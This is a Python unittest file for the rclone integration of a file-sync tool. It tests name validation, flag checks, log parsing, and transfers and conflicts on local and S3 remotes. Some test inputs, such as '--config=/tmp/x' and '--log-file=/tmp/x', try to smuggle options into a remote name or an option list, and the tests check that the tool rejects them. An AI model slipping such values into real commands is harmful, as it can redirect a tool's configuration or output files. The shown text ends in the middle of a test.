# -*- coding: utf-8 -*-
"""rclone panes: validation, flag checks and log parsing (no rclone
needed), copies/renames/conflicts against a local-type remote (needs the
rclone binary), and S3/WebDAV storage plus the UI in the Docker rig
(MCRSYNC_TEST_RCLONE, see test/README.md)."""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))
import mcrsync as m
from test_mcrsync import NASTY_NAMES
from test_safety import write, read, snapshot

HAVE_RCLONE = shutil.which("rclone") is not None
# "s3=http://host:9000 dav=http://host:8080"
SERVICES = dict(s.split("=", 1) for s in os.environ.get("MCRSYNC_TEST_RCLONE", "").split())
OPTS = m.DEFAULT_RCLONE_OPTS
FUTURE = time.time() + 86400
CONFIG_DIR = tempfile.mkdtemp(prefix="mcrsync-rclone-test-")
ALIASED = os.path.join(CONFIG_DIR, "aliased")


def write_config():
    """A config with a local remote, an alias of a local folder, a remote
    whose endpoint is down and - in the rig - S3 and WebDAV servers."""
    if not os.path.isdir(ALIASED):
        os.makedirs(ALIASED)
    lines = ["[loc]", "type = local", "",
             "[al]", "type = alias", "remote = " + ALIASED, "",
             "[dead]", "type = s3", "provider = Other", "access_key_id = x",
             "secret_access_key = y", "endpoint = http://127.0.0.1:1", "",
             "[with space]", "type = local", ""]
    if "s3" in SERVICES:
        lines += ["[s3]", "type = s3", "provider = Other", "access_key_id = test",
                  "secret_access_key = testsecret", "endpoint = " + SERVICES["s3"], ""]
    if "dav" in SERVICES:
        lines += ["[dav]", "type = webdav", "vendor = other", "url = " + SERVICES["dav"], ""]
    path = os.path.join(CONFIG_DIR, "rclone.conf")
    with open(path, "w") as f:
        f.write("\n".join(lines))
    return path


def setUpModule():
    os.environ["RCLONE_CONFIG"] = write_config()
    # fail fast against the dead endpoint
    os.environ["RCLONE_RETRIES"] = "1"
    os.environ["RCLONE_LOW_LEVEL_RETRIES"] = "1"
    os.environ["RCLONE_CONTIMEOUT"] = "3s"


def tearDownModule():
    shutil.rmtree(CONFIG_DIR, ignore_errors=True)


def log_line(level, msg, obj=None, object_type="*local.Object", **extra):
    entry = {"level": level, "msg": msg, "source": "x.go:1", "time": "2026-11-01T00:00:00Z"}
    if obj is not None:
        entry.update({"object": obj, "objectType": object_type})
    entry.update(extra)
    return json.dumps(entry)


# ----------------------------------------------------------------------
# without rclone
# ----------------------------------------------------------------------

class RcloneSpecTest(unittest.TestCase):
    def test_names(self):
        for good in ("b2", "my-cloud_2", "_x"):
            self.assertEqual(m.RcloneSpec(good).remote, good)
        # an option, a connection string, a path, a second remote, ...
        for bad in ("-x", "--config=/tmp/x", "a,b=c", "a b", "a:b", "a/b", "", None, 5,
                    "x\n", ".hidden", "ünï"):
            with self.assertRaises(ValueError, msg=repr(bad)):
                m.RcloneSpec(bad)

    def test_paths(self):
        s = m.RcloneSpec("b2")
        self.assertEqual((s.key(), s.display_path("/bkt/x"), s.arg("/bkt/x")),
                         ("rclone:b2", "b2:/bkt/x", "b2:/bkt/x"))
        self.assertEqual(s.tool, m.TOOL_RCLONE)

    def test_conn_from_dict(self):
        self.assertIsNone(m.conn_from_dict(None))
        self.assertEqual(m.conn_from_dict({"type": "rclone", "remote": "b2"}).key(), "rclone:b2")
        old = m.conn_from_dict({"user": "u", "host": "h", "port": 22})
        self.assertEqual(old.kind, "ssh")
        self.assertEqual(m.conn_from_dict(old.to_dict()).key(), "u@h:22")
        for bad in ({"type": "ftp"}, {"type": "rclone"}, {"type": "rclone", "remote": "-x"},
                    "b2", ["b2"]):
            with self.assertRaises((ValueError, KeyError), msg=repr(bad)):
                m.conn_from_dict(bad)

    def test_normalize(self):
        for given, want in (("", "/"), ("~", "/"), ("bkt/x", "/bkt/x"), ("//bkt//x/", "/bkt/x"),
                            ("/a/../b", "/b")):
            self.assertEqual(m.RcloneFs.normalize(given), want)


class RcloneQueueItemTest(unittest.TestCase):
    def test_tool_and_round_trip(self):
        it = m.QueueItem("/src", "/bkt/src", True, None, m.RcloneSpec("b2"))
        self.assertEqual(it.tool(), m.TOOL_RCLONE)
        back = m.QueueItem.from_dict(json.loads(json.dumps(it.to_dict())))
        self.assertEqual((back.dst_conn.key(), back.tool()), ("rclone:b2", m.TOOL_RCLONE))
        self.assertEqual(m.QueueItem("/a", "/b").tool(), m.TOOL_RSYNC)
        ssh = m.QueueItem("/a", "/b", True, m.ConnSpec("u", "h"))
        self.assertEqual(ssh.tool(), m.TOOL_RSYNC)

    def test_combinations(self):
        rc = {"type": "rclone", "remote": "b2"}
        ssh = {"type": "ssh", "user": "u", "host": "h"}
        ok = m.QueueItem.from_dict({"src": "/a", "dst": "/b", "src_conn": rc,
                                    "dst_conn": {"type": "rclone", "remote": "gd"}})
        self.assertEqual(ok.tool(), m.TOOL_RCLONE)
        for src, dst in ((rc, ssh), (ssh, rc), (ssh, ssh)):
            with self.assertRaises(ValueError):
                m.QueueItem.from_dict({"src": "/a", "dst": "/b", "src_conn": src, "dst_conn": dst})

    def test_queue_file(self):
        tmp = tempfile.mkdtemp()
        try:
            path = os.path.join(tmp, "q.json")
            item = {"src": "/a", "dst": "/b", "dst_conn": {"type": "rclone", "remote": "b2"}}
            for bad in (["-v"], ["--update", "--log-file=/tmp/x"], ["-uP"], [], "--update"):
                with open(path, "w") as f:
                    json.dump({"rclone_opts": bad, "items": [item]}, f)
                with self.assertRaises(ValueError, msg=repr(bad)):
                    m.QueueFile.read(path)
            with open(path, "w") as f:
                json.dump({"rclone_opts": ["--update", "--exclude=*.tmp"], "items": [item]}, f)
            items, rsync_opts, rclone_opts = m.QueueFile.read(path)
            self.assertEqual((rsync_opts, rclone_opts), (None, ["--update", "--exclude=*.tmp"]))
            self.assertEqual(items[0].dst_display(), "b2:/b")
        finally:
            shutil.rmtree(tmp)


class RcloneFlagsTest(unittest.TestCase):
    F = m.RcloneFlags

    def test_defaults(self):
        self.assertTrue(self.F.has_update(OPTS))
        self.assertTrue(self.F.has(OPTS, "l", "--links"))
        self.assertEqual((self.F.risky(OPTS), self.F.problems(OPTS)), ([], ""))

    def test_problems(self):
        for opts in (["-v"], ["-vv"], ["-uv"], ["-q"], ["-P"], ["--progress"],
                     ["--log-file=/x"], ["--log-file", "/x"], ["--log-level", "INFO"],
                     ["--stats=5s"], ["--stats-one-line"], ["--use-json-log"], ["-i"],
                     ["--ask-password"]):
            self.assertNotEqual(self.F.problems(opts), "", repr(opts))
        for opts in (["--exclude=*.v"], ["-u", "-l", "-M"], ["--bwlimit=1M"], ["-c"]):
            self.assertEqual(self.F.problems(opts), "", repr(opts))

    def test_risky(self):
        self.assertEqual(self.F.risky(["-u", "-I", "-uL", "--backup-dir=b:/old", "--delete-before",
                                       "--ignore-times", "--exclude", "x"]),
                         ["-I", "-uL", "--backup-dir=b:/old", "--delete-before", "--ignore-times"])

    def test_toggle(self):
        links = [c for c in self.F.CHOICES if c[1] == "--links"][0]
        self.assertEqual(self.F.toggle(["-ul"], links), ["-u"])
        self.assertEqual(self.F.toggle(["--update"], links), ["--update", "-l"])
        self.assertEqual(self.F.others(["-ulM", "--exclude", "x"]), ["--exclude", "x"])

    def test_sync_flag(self):
        sync = [c for c in self.F.CHOICES if c[1] == "--delete"][0]
        self.assertTrue(sync[3])
        opts = self.F.toggle(OPTS, sync)
        self.assertTrue(self.F.is_sync(opts))
        self.assertEqual(self.F.risky(opts), ["--delete"])
        self.assertFalse(self.F.is_sync(OPTS + ["--delete-after"]))


class RcloneParseTest(unittest.TestCase):
    P = staticmethod(m.RcloneRunner.parse_line)

    def test_events(self):
        cases = [
            (log_line("debug", "Destination is newer than source, skipping", "a b/c.txt"),
             ("newer", "a b/c.txt", None)),
            (log_line("info", "Copied (new)", "sub/b.txt"), ("copied", "sub/b.txt", False)),
            (log_line("info", "Copied (replaced existing)", "x"), ("copied", "x", True)),
            (log_line("warning", "Skipped copy as --dry-run is set (size 6)", "d", size=6,
                      skipped="copy"), ("would_copy", "d", 6)),
            (log_line("debug", "Destination mod time is within 1ns of source and files identical, "
                      "skipping", "same.txt"), ("unchanged", "same.txt", None)),
            (log_line("debug", "Unchanged skipping", "u"), ("unchanged", "u", None)),
            (log_line("info", "Deleted", "old/x"), ("deleted", "old/x", False)),
            (log_line("warning", "Skipped delete as --dry-run is set (size 2)", "z", size=2,
                      skipped="delete"), ("deleted", "z", False)),
            (log_line("info", "Removing directory", "old", object_type="string"),
             ("deleted", "old", True)),
            (log_line("warning", "Skipped remove directory as --dry-run is set", "old",
                      object_type="string", skipped="remove directory"), ("deleted", "old", True)),
            (log_line("warning", "Can't follow symlink without -L/--copy-links", "ln",
                      object_type="string"),
             ("symlink", "ln", "Can't follow symlink without -L/--copy-links")),
            (log_line("error", "Failed to copy: permission denied", "p"),
             ("error", "p", "p: Failed to copy: permission denied")),
            (log_line("error", "directory not found", "Local file system at /x",
                      object_type="*local.Fs"),
             ("error", "Local file system at /x", "Local file system at /x: directory not found")),
            ("2026/11/01 15:44:28 Failed to copy: directory not found",
             ("error", "", "Failed to copy: directory not found")),
            ("2026/11/01 15:44:28 ERROR : x: failed", ("error", "", "x: failed")),
            # printed before the JSON log starts, e.g. for RCLONE_* variables
            ("2026/11/01 15:44:28 NOTICE: Setting --retries \"1\" from environment variable",
             ("notice", "", "Setting --retries \"1\" from environment variable")),
        ]
        for line, want in cases:
            self.assertEqual(self.P(line), want, line)
        stats = self.P(json.dumps({"level": "info", "msg": "x", "stats": {"bytes": 5}}))
        self.assertEqual(stats, ("stats", "", {"bytes": 5}))
        for ignored in ("", "  ", log_line("debug", "Waiting for checks to finish"),
                        log_line("debug", "md5 = abc OK", "f"), "{}"):
            self.assertIsNone(self.P(ignored), ignored)
        # a debug message about a file that isn't a copy decision
        self.assertIsNone(self.P(log_line("debug", "Sizes identical", "f")))

    def test_progress(self):
        p = m.Progress(False, 100, 4)
        p.phase = m.Progress.SCANNING
        p.feed_unchanged(40)
        self.assertEqual(p.phase, m.Progress.COPYING)
        p.feed_conflict(10)
        p.feed_rclone_stats({"bytes": 30, "transfers": 1, "speed": 2048.0,
                             "transferring": [{"name": "big.iso", "bytes": 5, "size": 50}]})
        self.assertEqual((p.reviewed_bytes, p.reviewed_files, p.current), (80, 3, "big.iso"))
        text = p.describe()
        for part in ("reviewed 80.0B of 100.0B (80%)", "3 of 4 files", "1 conflict", "2.0K/s",
                     "now: big.iso"):
            self.assertIn(part, text)
        p.feed_rclone_stats({"bytes": "garbage"})
        self.assertEqual(p.bytes, 30)
        d = m.Progress(True, None, None)
        d.feed_listed(7, "x")
        self.assertEqual((d.copied_files, d.copied_bytes), (1, 7))
        d.feed_deleted("old/")
        d.feed_rclone_stats({"bytes": 0, "transfers": 0})
        self.assertEqual((d.phase, d.deleted), (m.Progress.DELETING, 1))
        self.assertIn("1 would be deleted", d.describe())

    def test_deleted_log_text(self):
        D = m.RcloneRunner.describe_event
        self.assertEqual(D(("deleted", "x", False), False, 0), "DELETED: x")
        self.assertEqual(D(("deleted", "d", True), True, 0), "would be DELETED: d/")

    def test_error_text(self):
        err = "\n".join([log_line("error", "first"), log_line("info", "x"),
                         "2026/11/01 15:44:32 Failed to create file system: didn't find section"])
        self.assertEqual(m.RcloneCli.error_text(err, 1),
                         "Failed to create file system: didn't find section")
        self.assertEqual(m.RcloneCli.error_text("", 3), "rclone exited with code 3")
        self.assertTrue(m.RcloneCli.is_network_error(
            'Get "http://127.0.0.1:1/b": dial tcp 127.0.0.1:1: connect: connection refused'))
        self.assertFalse(m.RcloneCli.is_network_error("directory not found"))

    def test_storage_path(self):
        r = m.RcloneRemote(m.RcloneSpec("al"))
        r.backend, r.root, r.is_local = "local", "/data/aliased", True
        self.assertEqual(r.storage_path("/a/b"), ("local", os.path.realpath("/data/aliased/a/b")))
        r.backend, r.root, r.is_local = "s3", "bkt", False
        self.assertEqual(r.storage_path("/x"), ("rclone:s3", "/bkt/x"))
        r.root = ""
        self.assertEqual(r.storage_path("/"), ("rclone:s3", "/"))


# ----------------------------------------------------------------------
# with rclone
# ----------------------------------------------------------------------

class RcloneBase(unittest.TestCase):
    REMOTE = "loc"

    def setUp(self):
        if not HAVE_RCLONE:
            self.skipTest("rclone is not installed")
        self.tmp = tempfile.mkdtemp()
        self.registry = m.ConnectionRegistry()
        self.runner = m.Transfers(self.registry)
        self.spec = m.RcloneSpec(self.REMOTE)
        self.assertEqual(self.registry.open_rclone(self.spec), "")
        self.fs = self.registry.fs_for(self.spec)
        self.base = self.remote_base()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def remote_base(self):
        """A fresh folder on the remote for this test."""
        path = os.path.join(self.tmp, "remote")
        os.makedirs(path)
        return path

    def rpath(self, *parts):
        return "/".join([self.base] + list(parts))

    def rclone(self, *args):
        return subprocess.check_output(["rclone"] + list(args), stderr=subprocess.DEVNULL)

    def put(self, rel, text, mtime=None):
        """Create a file on the remote, optionally with a modification time."""
        local = os.path.join(self.tmp, "put-src")
        write(local, text, mtime)
        self.rclone("copyto", local, self.spec.arg(self.rpath(rel)))

    def cat(self, rel):
        return self.rclone("cat", self.spec.arg(self.rpath(rel))).decode()

    def names(self, *parts):
        return sorted(n for n, d in self.fs.list_dir(self.rpath(*parts)))

    def run_item(self, item, opts=OPTS, log=None):
        return self.runner.run_item(item, (log.append if log is not None else lambda s: None), opts)

    def make_src(self):
        src = os.path.join(self.tmp, "src")
        for rel in ("a.txt", "sub/b.txt", "c.txt"):
            write(os.path.join(src, rel), rel)
        return src


class RcloneRemoteTest(RcloneBase):
    """Against a local-type remote - no services needed."""

    def test_remote_check(self):
        self.assertTrue(self.registry.is_open(self.spec))
        self.assertTrue(self.fs.remote.modtime_ok)
        self.assertFalse(self.fs.remote.bucket_based)
        missing = m.RcloneSpec("nope")
        self.assertIn("no remote 'nope'", self.registry.open_rclone(missing))
        self.assertFalse(self.registry.is_open(missing))
        self.assertIn("rclone:nope (there is no remote", self.registry.describe([missing]))
        names = m.RcloneCli.list_remotes()
        self.assertIn("with space", names)
        self.assertIn("loc", names)

    def test_too_old(self):
        real = m.RcloneCli.version
        m.RcloneCli.version = staticmethod(lambda: (1, 59))
        try:
            text = m.ConnectionRegistry().open_rclone(self.spec)
        finally:
            m.RcloneCli.version = real
        self.assertIn("too old", text)

    def test_not_installed(self):
        real = m.RcloneCli.BINARY
        m.RcloneCli.BINARY = "/nonexistent/rclone"
        try:
            text = m.ConnectionRegistry().open_rclone(self.spec)
        finally:
            m.RcloneCli.BINARY = real
        self.assertIn("is it installed", text)

    def test_encrypted_config(self):
        conf = os.path.join(HERE, "fixtures", "encrypted-rclone.conf")
        saved = os.environ["RCLONE_CONFIG"]
        os.environ["RCLONE_CONFIG"] = conf
        try:
            with self.assertRaises(m.FsError) as ctx:
                m.RcloneCli.list_remotes()
            self.assertIn("RCLONE_PASSWORD_COMMAND", str(ctx.exception))
            os.environ["RCLONE_PASSWORD_COMMAND"] = "echo secret"
            self.assertEqual(m.RcloneCli.list_remotes(), ["enc_loc"])
        finally:
            os.environ["RCLONE_CONFIG"] = saved
            os.environ.pop("RCLONE_PASSWORD_COMMAND", None)

    def test_list_stat_mkdir_rename(self):
        for n in NASTY_NAMES:
            write(os.path.join(self.base, n), n)
        os.makedirs(os.path.join(self.base, "dir"))
        # rclone shows control characters as symbols (U+2400 + code)
        shown = [n.replace("\n", "␊") for n in NASTY_NAMES]
        self.assertEqual(self.names(), sorted(shown + ["dir"]))
        self.assertEqual(self.fs.list_dir(self.base)[0], ("dir", True))
        self.assertEqual((self.fs.stat(self.rpath("dir")), self.fs.stat(self.rpath("a b")),
                          self.fs.stat(self.rpath("missing"))), ("dir", "file", None))
        self.assertEqual(self.fs.resolve(self.base + "/dir/"), self.rpath("dir"))
        with self.assertRaises(m.FsError):
            self.fs.resolve(self.rpath("missing"))
        # never replaces anything
        with self.assertRaises(m.FsError):
            self.fs.rename(self.rpath("a b"), self.rpath("it's"))
        with self.assertRaises(m.FsError):
            self.fs.mkdir(self.rpath("dir"))
        self.assertEqual(read(os.path.join(self.base, "it's")), "it's")
        self.fs.rename(self.rpath("a b"), self.rpath("renamed"))
        self.fs.rename(self.rpath("dir"), self.rpath("dir2"))
        self.fs.mkdir(self.rpath("new"))
        self.assertIn("renamed", self.names())
        self.assertIn("dir2", self.names())
        self.assertNotIn("a b", self.names())
        self.assertTrue(os.path.isdir(os.path.join(self.base, "new")))
        self.assertEqual(read(os.path.join(self.base, "renamed")), "a b")

    def test_size(self):
        src = self.make_src()
        self.assertEqual(m.RcloneFs(self.fs.remote).size(src, True, m.threading.Event()),
                         (len("a.txtsub/b.txtc.txt"), 3))

    def test_push_conflicts_progress_and_resolution(self):
        src = self.make_src()
        dst = self.rpath("dst")
        write(os.path.join(dst, "a.txt"), "newer", FUTURE)
        write(os.path.join(dst, "c.txt"), "c.txt")
        st = os.stat(os.path.join(src, "c.txt"))
        # exactly the same time: a float can round up by a nanosecond
        os.utime(os.path.join(dst, "c.txt"), ns=(st.st_atime_ns, st.st_mtime_ns))
        it = m.QueueItem(src, dst, True, None, self.spec)
        it.size_bytes, it.size_files = m.LOCAL_FS.size(src, True, m.threading.Event())
        log = []
        self.assertTrue(self.run_item(it, log=log))
        self.assertEqual(it.status, m.STATUS_INCOMPLETE, it.error_text)
        self.assertEqual([c.relpath for c in it.conflicts], ["a.txt"])
        self.assertEqual(read(os.path.join(dst, "a.txt")), "newer")
        self.assertEqual([r[:2] for r in it.copied_list],
                         [(os.path.join(src, "sub/b.txt"), "loc:" + dst + "/sub/b.txt")])
        p = it.progress
        # every file reviewed, incl. the unchanged one and the conflict
        self.assertEqual((p.reviewed_files, p.reviewed_bytes), (3, it.size_bytes))
        self.assertEqual((p.conflicts, p.unchanged_files, it.copied_files), (1, 1, 1))
        self.assertTrue(any(l.startswith("CONFLICT (target newer") for l in log), log)
        self.assertTrue(any(l.startswith("copied: sub/b.txt") for l in log), log)

        c = it.conflicts[0]
        ok, err = self.runner.resolve_conflict(it, c, "autorename")
        self.assertTrue(ok, err)
        ok, err = self.runner.resolve_conflict(it, c, "rename")
        self.assertTrue(ok, err)
        files = snapshot(dst)
        self.assertEqual(files["a.txt"], "a.txt")
        self.assertEqual(sorted(v for k, v in files.items() if k.startswith("a.")),
                         ["a.txt", "a.txt", "newer"])
        # the stale conflict is refused now that the target isn't newer
        ok, err = self.runner.resolve_conflict(it, c, "autorename")
        self.assertFalse(ok)
        self.assertIn("changed since the run", err)

    def test_dry_run_creates_nothing(self):
        src = self.make_src()
        dst = self.rpath("fresh", "deeper")
        it = m.QueueItem(src, dst, True, None, self.spec)
        self.run_item(it, OPTS + ["--dry-run"])
        self.assertEqual(it.status, m.STATUS_DRY_OK, it.error_text)
        self.assertFalse(os.path.exists(os.path.join(self.base, "fresh")))
        self.assertEqual(len(it.copied_list), 3)
        self.assertTrue(all(r[2].startswith("would copy") for r in it.copied_list))
        self.assertEqual(it.progress.copied_files, 3)

    def test_sync_deletes_only_with_flag(self):
        src = self.make_src()
        dst = self.rpath("dst")
        write(os.path.join(dst, "a.txt"), "newer", FUTURE)
        write(os.path.join(dst, "extra.txt"), "x")
        write(os.path.join(dst, "old", "y.txt"), "y")
        it = m.QueueItem(src, dst, True, None, self.spec)
        self.run_item(it)
        self.assertEqual(it.progress.deleted, 0)
        self.assertIn("old/y.txt", snapshot(dst))

        sync = OPTS + ["--delete"]
        cmd = self.runner.item_cmd(it, sync)
        self.assertEqual(cmd[1], "sync")
        self.assertNotIn("--delete", cmd)
        log = []
        self.run_item(it, sync + ["--dry-run"], log)
        self.assertEqual(it.status, m.STATUS_DRY_INCOMPLETE, it.error_text)
        self.assertIn("extra.txt", snapshot(dst))
        self.assertEqual(it.progress.deleted, 3)
        for line in ("would be DELETED: extra.txt", "would be DELETED: old/y.txt",
                     "would be DELETED: old/"):
            self.assertIn(line, log)

        log = []
        self.run_item(it, sync, log)
        self.assertEqual(it.status, m.STATUS_INCOMPLETE, it.error_text)
        # the newer target file is a conflict, not overwritten or deleted
        self.assertEqual(snapshot(dst), {"a.txt": "newer", "c.txt": "c.txt", "sub": "<dir>",
                                         "sub/b.txt": "sub/b.txt"})
        self.assertEqual([c.relpath for c in it.conflicts], ["a.txt"])
        self.assertEqual(it.progress.deleted, 3)
        self.assertIn("DELETED: old/", log)

    def test_sync_flag_on_single_file(self):
        src = self.make_src()
        write(os.path.join(self.base, "x", "other.txt"), "o")
        it = m.QueueItem(os.path.join(src, "a.txt"), self.rpath("x", "a.txt"), False, None,
                         self.spec)
        self.assertEqual(self.runner.item_cmd(it, OPTS + ["--delete"])[1], "copyto")
        self.run_item(it, OPTS + ["--delete"])
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(snapshot(os.path.join(self.base, "x")),
                         {"a.txt": "a.txt", "other.txt": "o"})

    def test_single_file_and_pull(self):
        src = self.make_src()
        it = m.QueueItem(os.path.join(src, "a.txt"), self.rpath("x", "a.txt"), False, None,
                         self.spec)
        self.run_item(it)
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(read(os.path.join(self.base, "x", "a.txt")), "a.txt")
        back = os.path.join(self.tmp, "back")
        pull = m.QueueItem(self.rpath("x"), back, True, self.spec, None)
        self.run_item(pull)
        self.assertEqual(pull.status, m.STATUS_OK, pull.error_text)
        self.assertEqual(snapshot(back), {"a.txt": "a.txt"})

    def test_remote_to_remote(self):
        src = self.make_src()
        al = m.RcloneSpec("al")
        self.assertEqual(self.registry.open_rclone(al), "")
        it = m.QueueItem(src, "/copied", True, self.spec, al)
        self.run_item(it)
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(snapshot(os.path.join(ALIASED, "copied")), snapshot(src))

    def test_into_itself_refused(self):
        src = self.make_src()
        al = m.RcloneSpec("al")
        self.registry.open_rclone(al)
        os.makedirs(os.path.join(ALIASED, "photos"))
        for item in (m.QueueItem(src, os.path.join(src, "sub", "src"), True, None, self.spec),
                     m.QueueItem(src, src, True, self.spec, self.spec),
                     # the alias points to ALIASED
                     m.QueueItem(os.path.join(ALIASED, "photos"), "/photos/photos", True,
                                 None, al),
                     m.QueueItem("/photos", os.path.join(ALIASED, "photos", "x"), True, al,
                                 self.spec)):
            before = snapshot(self.tmp)
            self.run_item(item)
            self.assertEqual(item.status, m.STATUS_FAIL, item.dst_display())
            self.assertIn("source itself or inside it", item.error_text)
            self.assertEqual(snapshot(self.tmp), before)

    def test_surprising_shapes_refused(self):
        src = self.make_src()
        os.makedirs(self.rpath("a.txt"))
        write(self.rpath("sub"), "file")
        for item, why in ((m.QueueItem(os.path.join(src, "a.txt"), self.rpath("a.txt"), False,
                                       None, self.spec), "a folder with that name"),
                          (m.QueueItem(os.path.join(src, "sub"), self.rpath("sub"), True, None,
                                       self.spec), "a file with that name")):
            self.run_item(item)
            self.assertEqual(item.status, m.STATUS_FAIL)
            self.assertIn(why, item.error_text)
        self.assertEqual(read(self.rpath("sub")), "file")

    def test_symlinks_skipped_into_local_folders(self):
        """--links is left out when the target is a local folder (here via
        a local-type remote) - see test_attacks for why."""
        src = self.make_src()
        os.symlink("a.txt", os.path.join(src, "link"))
        for name, opts in (("default", OPTS), ("without", ["--update"])):
            it = m.QueueItem(src, self.rpath(name), True, None, self.spec)
            self.run_item(it, opts)
            self.assertEqual(it.status, m.STATUS_OK, it.error_text)
            self.assertFalse(os.path.lexists(self.rpath(name, "link")))
            self.assertEqual([r[2] for r in it.errors_list],
                             ["symlink skipped - tick -l, --links to keep it"])

    def test_output_flags_refused(self):
        src = self.make_src()
        it = m.QueueItem(src, self.rpath("v"), True, None, self.spec)
        self.run_item(it, OPTS + ["-v"])
        self.assertEqual(it.status, m.STATUS_FAIL)
        self.assertFalse(os.path.exists(self.rpath("v")))

    def test_failure_is_sync_fail(self):
        it = m.QueueItem(os.path.join(self.tmp, "missing"), self.rpath("m"), True, None, self.spec)
        self.assertTrue(self.run_item(it))
        self.assertEqual(it.status, m.STATUS_FAIL)
        self.assertIn("directory not found", it.error_text)

    def test_pause_exit_codes(self):
        """5, 7 and 8 pause the run instead of failing the item."""
        fake = os.path.join(self.tmp, "fake-rclone")
        real = shutil.which("rclone")
        with open(fake, "w") as f:
            f.write('#!/bin/sh\n'
                    'if [ "$1" = copy ]; then\n'
                    '  echo \'{"level":"error","msg":"quota exceeded","source":"x"}\' >&2\n'
                    '  exit "$FAKE_RC"\n'
                    'fi\n'
                    'exec %s "$@"\n' % real)
        os.chmod(fake, 0o755)
        saved = m.RcloneCli.BINARY
        m.RcloneCli.BINARY = fake
        try:
            for rc, why in (("5", "temporary error"), ("7", "rclone config reconnect loc:"),
                            ("8", "transfer limit")):
                os.environ["FAKE_RC"] = rc
                self.assertEqual(self.registry.open_rclone(self.spec), "")
                it = m.QueueItem(self.make_src() if rc == "5" else os.path.join(self.tmp, "src"),
                                 self.rpath("p"), True, None, self.spec)
                self.assertFalse(self.run_item(it))
                self.assertEqual(it.status, m.STATUS_PENDING)
                self.assertFalse(self.registry.is_open(self.spec))
                self.assertIn(why, self.registry.problem(self.spec))
                self.assertIn("quota exceeded", self.registry.problem(self.spec))
            os.environ["FAKE_RC"] = "6"
            self.registry.open_rclone(self.spec)
            self.assertTrue(self.run_item(it))
            self.assertEqual(it.status, m.STATUS_FAIL)
            self.assertIn("quota exceeded", it.error_text)
        finally:
            m.RcloneCli.BINARY = saved
            os.environ.pop("FAKE_RC", None)

    def test_unreachable_remote_pauses(self):
        dead = m.RcloneSpec("dead")
        self.assertEqual(self.registry.open_rclone(dead), "")
        it = m.QueueItem(self.make_src(), "/bkt/x", True, None, dead)
        log = []
        self.assertFalse(self.run_item(it, log=log))
        self.assertEqual(it.status, m.STATUS_PENDING)
        self.assertFalse(self.registry.is_open(dead))
        self.assertIn("can't be reached", self.registry.problem(dead))
        self.assertTrue(any("CONNECTION LOST" in l for l in log), log)
        fs = self.registry.fs_for(dead)
        with self.assertRaises(m.ConnectionLost):
            fs.list_dir("/bkt")


@unittest.skipUnless("s3" in SERVICES, "needs the rclone-s3 service of the Docker rig")
class RcloneS3Test(RcloneBase):
    """Object storage: no real folders, renames are copy + delete."""

    REMOTE = "s3"

    def remote_base(self):
        bucket = "t" + uuid.uuid4().hex[:12]
        self.rclone("mkdir", "s3:" + bucket)
        return "/" + bucket

    def test_features_and_folders(self):
        r = self.fs.remote
        self.assertTrue(r.bucket_based)
        self.assertTrue(r.modtime_ok)
        self.assertEqual(self.fs.stat(self.rpath("missing")), None)
        self.assertFalse(self.fs.exists(self.rpath("missing", "deeper")))
        self.assertTrue(self.fs.isdir(self.base))
        self.fs.mkdir(self.rpath("empty"))
        # not stored by S3, but shown for this session
        self.assertEqual(self.fs.list_dir(self.base), [("empty", True)])
        self.assertTrue(self.fs.isdir(self.rpath("empty")))
        with self.assertRaises(m.FsError):
            self.fs.mkdir(self.rpath("empty"))
        self.put("full/f.txt", "f")
        self.assertEqual(self.names(), ["empty", "full"])
        self.assertEqual(self.fs.stat(self.rpath("full", "f.txt")), "file")

    def test_rename(self):
        self.put("d/a.txt", "a")
        self.put("d/b.txt", "b")
        self.put("other.txt", "o")
        with self.assertRaises(m.FsError):
            self.fs.rename(self.rpath("d", "a.txt"), self.rpath("d", "b.txt"))
        self.assertEqual(self.cat("d/b.txt"), "b")
        self.fs.rename(self.rpath("d", "a.txt"), self.rpath("d", "c.txt"))
        self.assertEqual(self.names("d"), ["b.txt", "c.txt"])
        self.fs.rename(self.rpath("d"), self.rpath("e"))
        self.assertEqual(self.names(), ["e", "other.txt"])
        self.assertEqual(self.cat("e/c.txt"), "a")

    def test_push_pull_and_resolution(self):
        src = self.make_src()
        self.put("dst/a.txt", "newer", FUTURE)
        it = m.QueueItem(src, self.rpath("dst"), True, None, self.spec)
        self.run_item(it)
        self.assertEqual(it.status, m.STATUS_INCOMPLETE, it.error_text)
        self.assertEqual([c.relpath for c in it.conflicts], ["a.txt"])
        self.assertEqual(self.cat("dst/a.txt"), "newer")
        ok, err = self.runner.resolve_conflict(it, it.conflicts[0], "rename")
        self.assertTrue(ok, err)
        self.assertEqual(self.cat("dst/a.txt"), "a.txt")
        renamed = [n for n in self.names("dst") if n.startswith("a.conflict-")]
        self.assertEqual(len(renamed), 1)
        self.assertEqual(self.cat("dst/" + renamed[0]), "newer")

        back = os.path.join(self.tmp, "back")
        pull = m.QueueItem(self.rpath("dst"), back, True, self.spec, None)
        self.run_item(pull)
        self.assertEqual(pull.status, m.STATUS_OK, pull.error_text)
        self.assertEqual(snapshot(back)["sub/b.txt"], "sub/b.txt")
        self.assertEqual(self.fs.size(self.rpath("dst"), True, m.threading.Event()),
                         (len("a.txtsub/b.txtc.txtnewer"), 4))

    def test_sync(self):
        src = self.make_src()
        self.put("dst/extra.txt", "x")
        self.put("dst/old/y.txt", "y")
        it = m.QueueItem(src, self.rpath("dst"), True, None, self.spec)
        log = []
        self.run_item(it, OPTS + ["--delete"], log)
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(self.names("dst"), ["a.txt", "c.txt", "sub"])
        self.assertIn("DELETED: old/y.txt", log)

    def test_symlinks_uploaded_as_rclonelink(self):
        src = self.make_src()
        os.symlink("a.txt", os.path.join(src, "link"))
        it = m.QueueItem(src, self.rpath("up"), True, None, self.spec)
        self.run_item(it)
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(self.cat("up/link.rclonelink"), "a.txt")
        self.assertEqual(it.errors_list, [])

    def test_cloud_to_cloud(self):
        self.put("x/one.txt", "1")
        other = "/t" + uuid.uuid4().hex[:12]
        self.rclone("mkdir", "s3:" + other)
